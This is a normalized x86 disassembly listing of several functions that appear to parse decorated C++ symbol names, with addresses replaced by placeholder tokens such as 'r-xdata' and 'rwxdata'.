jle r-xdata
mov eax [ rwxdata ]
mov cl [ eax ]
cmp cl bl
je r-xdata
and [ ebp - 0x2c ] edi
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
mov [ ebp - 0x30 ] ebx
call sub_426811
pop ecx
lea eax [ ebp - 0x28 ]
push eax
call sub_4236e8
test [ rwxdata ] 0x4000
pop ecx
je r-xdata
mov [ rwxdata ] eax
lea eax [ ebp - 0x3c ]
push eax
call sub_42373a
jmp r-xdata
lea eax [ ebp - 0x1c ]
mov ecx [ rwxdata ]
cmp [ ecx ] 0x9
je r-xdata
push r--data
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x4c ]
jmp r-xdata
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_42237d
lea eax [ ebp - 0x14 ]
push eax
call sub_4280c3
push eax
call [ rwxdata ]
pop ecx
pop ecx
cmp eax ebx
je r-xdata
pop ecx
lea eax [ ebp - 0x1c ]
push eax
call sub_422498
push r--data
push eax
call sub_422db4
add esp 0xc
mov ecx eax
call sub_422dfc
jmp r-xdata
push r--data
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
jmp r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ecx
lea ecx [ ebp - 0x1c ]
call sub_422a00
jmp r-xdata
sub_423cc0
mov edi edi
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rwxdata ]
movsx edx [ eax ]
push ebx
xor ebx ebx
mov ecx 0xffff0000
and [ ebp - 0x4 ] ecx
and [ ebp - 0x14 ] ecx
push esi
xor esi esi
inc eax
cmp edx 0x41
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ rwxdata ] eax
jg r-xdata
cmp edx 0x42
je r-xdata
je r-xdata
xor esi esi
inc esi
jle r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x8 ]
call sub_422a00
cmp esi ebx
je r-xdata
cmp edx ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push 0x2
jmp r-xdata
cmp edx 0x5a
jle r-xdata
dec eax
mov [ rwxdata ] eax
cmp edx 0x2f
jle r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push r--data
push eax
call sub_422db4
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0x200
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_422338
cmp edx 0x5f
jne r-xdata
pop esi
pop ebx
leave
retn
cmp edx 0x31
jle r-xdata
movsx ecx [ eax ]
inc eax
cmp ecx 0x4f
mov [ rwxdata ] eax
jg r-xdata
and [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
cmp edx 0x39
jg r-xdata
cmp ecx 0x54
jg r-xdata
cmp ecx 0x44
jge r-xdata
push ebx
mov esi eax
lea eax [ ebp - 0x38 ]
push ebx
push eax
call sub_4243a4
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov [ rwxdata ] esi
cmp ecx ebx
je r-xdata
lea eax [ ebp - 0x58 ]
push eax
call sub_423afc
push eax
lea eax [ ebp - 0xa0 ]
push 0x3c
push eax
call sub_422d6c
add esp 0x10
push eax
lea ecx [ ebp - 0x18 ]
call sub_422929
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
je r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
cmp ecx 0x55
jl r-xdata
cmp ecx 0x53
jge r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x39
jg r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
cmp [ esi - 0x1 ] 0x31
jne r-xdata
push 0x3e
lea ecx [ ebp - 0x18 ]
call sub_422b60
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x4 ]
cmp al 0x3e
jne r-xdata
cmp ecx 0x56
jle r-xdata
sub ecx 0x50
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_422704
jmp r-xdata
cmp ecx 0x3f
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_422929
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x88 ]
push 0x7e
push eax
call sub_422d6c
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
cmp [ eax ] bl
jne r-xdata
mov [ eax ] 0x1
push 0x20
lea ecx [ ebp - 0x18 ]
call sub_422b60
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x57
jle r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x8 ]
call sub_422a00
push ebx
lea eax [ ebp - 0x80 ]
push ebx
push eax
call sub_423cc0
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
cmp ecx ebx
je r-xdata
dec ecx
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
movsx ecx [ eax ]
inc eax
mov [ rwxdata ] eax
cmp ecx ebx
je r-xdata
cmp ecx 0x40
jle r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x10 ]
call sub_422704
mov ecx [ ebp - 0xc ]
or ecx 0x8000
cmp ecx ebx
je r-xdata
inc eax
mov [ rwxdata ] eax
mov ecx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x14 ]
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_422a00
cmp ecx 0x59
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
test eax 0x400
je r-xdata
dec ecx
jne r-xdata
cmp ecx 0x30
jne r-xdata
cmp ecx 0x42
jle r-xdata
mov [ eax + 0x4 ] ecx
cmp ecx 0x2f
jle r-xdata
cmp ecx 0x5f
jne r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x8 ]
call sub_422a00
mov eax [ rwxdata ]
mov al [ eax ]
cmp al bl
jne r-xdata
push ebx
push r--data
jmp r-xdata
cmp ecx 0x43
jne r-xdata
cmp ecx 0x36
jle r-xdata
movsx ecx [ eax ]
inc eax
cmp ecx 0x41
mov [ rwxdata ] eax
jl r-xdata
movsx eax al
sub eax 0x30
js r-xdata
push 0x1
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
call sub_422905
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_423644
mov ecx [ ebp - 0xc ]
add esp 0xc
or ecx 0x1000
jmp r-xdata
push 0x1
push r--data
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x38
jg r-xdata
cmp ecx 0x44
jle r-xdata
cmp eax 0x5
jae r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
jmp r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x46
jle r-xdata
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x18 ]
call sub_422a00
mov eax [ rwxdata ]
movsx eax [ eax ]
inc [ rwxdata ]
cmp eax 0x30
je r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x10 ]
call sub_422704
mov eax [ rwxdata ]
cmp [ eax ] 0x3f
jne r-xdata
cmp ecx 0x4a
jg r-xdata
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_426949
pop ecx
pop ecx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
push 0x20
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_422dd8
mov ecx eax
call sub_422b18
mov ecx eax
jmp r-xdata
cmp eax 0x31
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_424785
pop ecx
push eax
lea ecx [ ebp - 0x10 ]
call sub_422929
lea eax [ ebp - 0x90 ]
push eax
call sub_425402
pop ecx
push eax
lea ecx [ ebp - 0x10 ]
call sub_422929
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
call sub_422b18
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_422b18
push 0x2c
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_4236e8
pop ecx
mov ecx eax
call sub_422dd8
push eax
lea ecx [ ebp - 0x10 ]
call sub_422929
push 0x2c
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
call sub_4236e8
pop ecx
mov ecx eax
call sub_422dd8
push eax
lea ecx [ ebp - 0x10 ]
call sub_422929
push 0x2c
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_4236e8
pop ecx
mov ecx eax
call sub_422dd8
push eax
lea ecx [ ebp - 0x10 ]
call sub_422929
push 0x29
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x50 ]
push ebx
push eax
call sub_422e20
pop ecx
pop ecx
mov ecx eax
call sub_422dd8
push eax
lea ecx [ ebp - 0x10 ]
call sub_422929
push 0x27
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_422dd8
jmp r-xdata
add eax 0xffffffce
cmp eax 0x2
jbe r-xdata
push r--data
lea ecx [ ebp - 0x10 ]
call sub_422bb2
mov ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
jmp r-xdata
inc [ rwxdata ]
jmp r-xdata
dec [ rwxdata ]
jmp r-xdata
push 0x1
sub_42425d
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
sub esp 0xa0
cmp [ eax ] 0x3f
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_422338
mov eax [ ebp + 0x8 ]
leave
retn
cmp [ eax + 0x1 ] 0x24
jne r-xdata
or [ ebp - 0x74 ] 0xffffffff
or [ ebp - 0x48 ] 0xffffffff
or [ ebp - 0xa0 ] 0xffffffff
push ebx
mov ebx [ rwxdata ]
push esi
mov esi [ rwxdata ]
lea ecx [ ebp - 0x74 ]
mov [ rwxdata ] ecx
lea ecx [ ebp - 0x48 ]
push edi
mov edi [ rwxdata ]
inc eax
mov [ rwxdata ] ecx
inc eax
lea ecx [ ebp - 0xa0 ]
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
cmp [ eax ] 0x3f
mov [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_4243a4
inc eax
mov [ rwxdata ] eax
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_423cc0
jmp r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov [ rwxdata ] 0x1
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ rwxdata ] edi
mov [ rwxdata ] esi
mov [ rwxdata ] ebx
pop edi
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn
lea eax [ ebp - 0x14 ]
push eax
call sub_423afc
push eax
lea eax [ ebp - 0x1c ]
push 0x3c
push eax
call sub_422d6c
add esp 0x10
push eax
lea ecx [ ebp - 0xc ]
call sub_422929
mov ecx [ ebp - 0xc ]
test ecx ecx
je r-xdata
push 0x3e
lea ecx [ ebp - 0xc ]
call sub_422b60
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ecx ]
call [ eax + 0x4 ]
cmp al 0x3e
jne r-xdata
mov eax [ rwxdata ]
cmp [ eax ] 0x0
je r-xdata
push 0x20
lea ecx [ ebp - 0xc ]
call sub_422b60
inc [ rwxdata ]
sub_4243a4
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
push ebx
mov bl [ eax ]
movsx eax bl
push esi
mov esi [ ebp + 0x8 ]
sub eax 0x30
mov [ ebp - 0x30 ] esi
cmp eax 0x9
ja r-xdata
and [ ebp - 0x1c ] 0x0
mov esi 0xffff0000
and [ ebp - 0x18 ] esi
cmp bl 0x3f
jne r-xdata
mov ecx [ rwxdata ]
inc [ rwxdata ]
push eax
push esi
call sub_4224e2
mov eax esi
jmp r-xdata
mov ecx [ rwxdata ]
push edi
mov edi r--data
push 0x13
mov edx edi
call sub_422193
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_42425d
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] eax
mov eax [ rwxdata ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
inc eax
mov [ rwxdata ] eax
cmp cl 0x40
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
mov ecx [ rwxdata ]
mov edi r--data
push 0xd
mov edx edi
call sub_422193
pop ecx
test eax eax
jne r-xdata
add [ rwxdata ] 0x13
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
dec eax
xor ecx ecx
mov [ rwxdata ] eax
cmp [ eax ] cl
setne cl
inc ecx
push ecx
lea ecx [ ebp - 0x1c ]
call sub_422461
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add [ rwxdata ] 0xd
lea eax [ ebp - 0x24 ]
push eax
call sub_4236e8
test [ rwxdata ] 0x4000
pop ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x30 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x18 ]
mov [ eax + 0x4 ] ecx
mov ecx [ rwxdata ]
cmp [ ecx ] 0x9
je r-xdata
push 0x40
push rwxdata
lea ecx [ ebp - 0x2c ]
call sub_42273d
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp bl 0x40
jne r-xdata
push r--data
lea ecx [ ebp - 0x1c ]
call sub_422a00
push r--data
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x38 ]
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_42237d
lea eax [ ebp - 0x14 ]
push eax
call sub_4280c3
push eax
call [ rwxdata ]
pop ecx
pop ecx
lea ecx [ ebp - 0x1c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_422498
mov ecx [ ebp - 0x28 ]
xor eax eax
and ecx esi
inc [ rwxdata ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ecx
jmp r-xdata
pop edi
push r--data
call sub_422a00
push r--data
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
jmp r-xdata
push eax
call sub_422a00
jmp r-xdata
push edi
push eax
call sub_422db4
add esp 0xc
mov ecx eax
call sub_422dfc
push eax
lea ecx [ ebp - 0x1c ]
call sub_422929
jmp r-xdata
sub_42459a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor ebx ebx
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
push eax
mov [ esi ] ebx
call sub_4243a4
add esp 0xc
push eax
mov ecx esi
call sub_421f4a
mov edi r--data
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
cmp al 0x40
jne r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
cmp al bl
je r-xdata
cmp al bl
je r-xdata
inc [ rwxdata ]
jmp r-xdata
cmp al 0x40
je r-xdata
cmp [ esi ] ebx
jne r-xdata
push 0x2
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
push esi
lea eax [ ebp - 0x8 ]
push eax
push edi
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_42561a
pop ecx
mov ecx eax
call sub_422dfc
mov ecx eax
call sub_422b18
push eax
mov ecx esi
call sub_421f4a
push esi
lea eax [ ebp - 0x18 ]
push eax
push edi
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_422338
mov ecx eax
call sub_422dfc
mov ecx eax
call sub_422b18
push eax
mov ecx esi
call sub_421f4a
push 0x1
mov ecx esi
call sub_422461
jmp r-xdata
sub_42467e
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
sub esp 0x18
push esi
push edi
mov ecx eax
shr ecx 0xf
xor edi edi
not ecx
inc edi
and ecx edi
je r-xdata
xor edi edi
test eax 0x1000
je r-xdata
mov ecx [ ebp + 0x8 ]
dec [ rwxdata ]
push r--data
call sub_422704
mov eax [ ebp + 0x8 ]
sub eax 0x54
je r-xdata
mov eax [ rwxdata ]
movsx eax [ eax ]
and [ ebp - 0x8 ] 0x0
mov esi 0xffff0000
and [ ebp - 0x4 ] esi
inc [ rwxdata ]
sub eax 0x0
je r-xdata
push r--data
dec eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_42459a
pop ecx
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_422929
mov ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r--data
jmp r-xdata
dec eax
je r-xdata
pop edi
pop esi
leave
retn
lea ecx [ ebp - 0x8 ]
call sub_422a00
push r--data
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edi ecx
call sub_422f72
push eax
lea eax [ ebp - 0x18 ]
push r--data
push eax
call sub_422db4
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0x10
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
dec eax
je r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] esi
test edi edi
je r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
push r--data
jmp r-xdata
sub_424785
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
cmp [ eax ] 0x3f
jne r-xdata
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_4243a4
inc eax
cmp [ eax ] 0x24
jne r-xdata
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov [ rwxdata ] eax
call sub_423cc0
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_42425d
pop ecx
pop ecx
jmp r-xdata
add esp 0xc
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_4247cf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push 0x0
call sub_421d75
add esp 0x4
push eax
lea ecx [ ebp - 0x8 ]
call sub_422704
mov eax [ rwxdata ]
cmp [ eax ] 0x0
je r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_422619
movsx ecx [ eax ]
inc eax
mov [ rwxdata ] eax
mov eax ecx
sub eax 0x30
je r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_422bb2
jmp r-xdata
dec eax
dec eax
je r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_422bb2
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call sub_42459a
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_422929
jmp r-xdata
sub eax 0x3
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_422338
mov eax [ ebp + 0x8 ]
leave
retn
sub_424867
mov edi edi
push ebp
mov ebp esp
sub esp 0x6c
push ebx
push esi
push edi
xor edi edi
mov esi 0xffff0000
and [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] edi
call sub_4217b5
mov ecx [ ebp + 0xc ]
mov ebx eax
xor eax eax
inc eax
cmp [ ecx ] edi
je r-xdata
mov [ ebp - 0x18 ] edi
test [ ecx + 0x4 ] 0x200
mov [ ebp - 0x18 ] eax
jne r-xdata
cmp ebx 0xfffe
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_422338
cmp ebx 0xffff
jne r-xdata
cmp ebx 0xfffd
jne r-xdata
push ecx
push eax
push [ ebp + 0x8 ]
call sub_422d90
add esp 0xc
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
and [ ebp - 0x4 ] 0x8000
mov edi 0x1800
mov ecx 0x1000
je r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
push [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_422929
mov eax [ ebp - 0x4 ]
mov ecx 0x7c00
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] ebx
and [ ebp - 0x10 ] edi
cmp [ ebp - 0x10 ] 0x800
sete al
mov [ ebp - 0x8 ] eax
test eax eax
mov eax ebx
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax ebx
and eax edi
sub eax 0x800
jmp r-xdata
mov edx ebx
and edx ecx
cmp edx 0x6800
jne r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov esi 0x1000
mov eax ebx
je r-xdata
test eax eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
push [ ebp + 0x8 ]
call sub_42350d
cmp [ ebp - 0x8 ] 0x0
mov eax ebx
je r-xdata
mov eax ebx
and eax 0x1b00
cmp eax ecx
je r-xdata
test eax eax
je r-xdata
and eax esi
and eax 0x400
jmp r-xdata
mov edx ebx
and edx ecx
cmp edx 0x7000
je r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx ebx
and edx 0x1b00
sub edx esi
neg edx
sbb edx edx
inc edx
neg eax
sbb eax eax
test edx eax
je r-xdata
test eax eax
je r-xdata
test eax eax
jne r-xdata
test ebx 0x4000
je r-xdata
mov eax ebx
and eax 0x1b00
cmp eax 0x1100
je r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax edi
sub eax 0x800
jmp r-xdata
push r--data
jmp r-xdata
mov edx ebx
and edx ecx
cmp edx 0x6000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
test edx edx
je r-xdata
mov eax [ rwxdata ]
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
cmp eax 0x1200
je r-xdata
and eax esi
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
lea ecx [ ebp - 0x24 ]
call sub_422bb2
jmp r-xdata
test eax eax
jne r-xdata
push r--data
push [ ebp + 0x8 ]
lea eax [ ebp - 0x6c ]
push eax
call sub_4234f7
pop ecx
push eax
lea eax [ ebp - 0x64 ]
push eax
push 0x7b
lea eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_422dd8
mov ecx eax
call sub_422b18
mov ecx eax
call sub_422dfc
jmp r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x4c ]
push eax
call sub_4247cf
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call sub_421f2b
shr eax 0x3
not eax
test al 0x1
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx ebx
and edx 0x1b00
sub edx 0x1100
neg edx
sbb edx edx
inc edx
neg eax
sbb eax eax
test edx eax
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
and edx ecx
cmp edx ecx
jne r-xdata
and [ ebp - 0x40 ] esi
and [ ebp - 0x38 ] esi
and [ ebp - 0x10 ] esi
and [ ebp - 0x48 ] esi
and [ ebp - 0x28 ] esi
xor edi edi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x2c ] edi
mov eax ebx
cmp edx edi
je r-xdata
cmp [ ebp - 0x10 ] edi
jne r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x4c ]
push eax
call sub_4247cf
push eax
lea eax [ ebp - 0x44 ]
push 0x20
push eax
call sub_422d6c
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x10
mov [ ebp - 0x20 ] eax
jmp r-xdata
and eax 0x6000
and eax edi
sub eax 0x800
jmp r-xdata
push r--data
jmp r-xdata
mov eax ebx
and eax 0x6000
mov eax ebx
and eax edi
sub eax 0x800
jmp r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
push [ ebp + 0x8 ]
call sub_422d18
jmp r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x4c ]
push eax
call sub_4234e1
pop ecx
mov ecx [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push 0x7b
lea eax [ ebp - 0x3c ]
push eax
call sub_422dd8
mov ecx eax
call sub_422b18
push eax
lea ecx [ ebp - 0x24 ]
call sub_422929
lea eax [ ebp - 0x4c ]
push eax
call sub_422adf
mov esi 0x1000
pop ecx
test [ rwxdata ] esi
jne r-xdata
mov ecx 0x1000
and eax esi
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
and eax esi
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
mov eax ebx
and eax 0x6000
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x8 ] edi
je r-xdata
cmp edx edi
je r-xdata
cmp eax edi
je r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_422bb2
lea eax [ ebp - 0x4c ]
push eax
call sub_422a35
mov eax [ rwxdata ]
pop ecx
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
push r--data
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x3c ]
push 0x2c
push eax
call sub_422d6c
add esp 0xc
mov ecx eax
call sub_422dfc
push eax
lea ecx [ ebp - 0x24 ]
call sub_422929
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx ebx
and edx 0x1b00
sub edx 0x1200
neg edx
sbb edx edx
inc edx
neg eax
sbb eax eax
test edx eax
je r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_426a09
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
and eax 0x1b00
xor edx edx
cmp eax 0x1100
sete dl
neg ecx
sbb ecx ecx
test edx ecx
jne r-xdata
test eax eax
je r-xdata
mov eax [ rwxdata ]
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
call sub_4234cb
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] eax
xor edi edi
mov eax ebx
and eax 0x700
cmp eax 0x600
jne r-xdata
mov ecx [ ebp - 0x20 ]
mov ecx eax
shr ecx 0x4
not ecx
test cl 0x1
je r-xdata
mov eax ebx
and eax ecx
cmp eax 0x7800
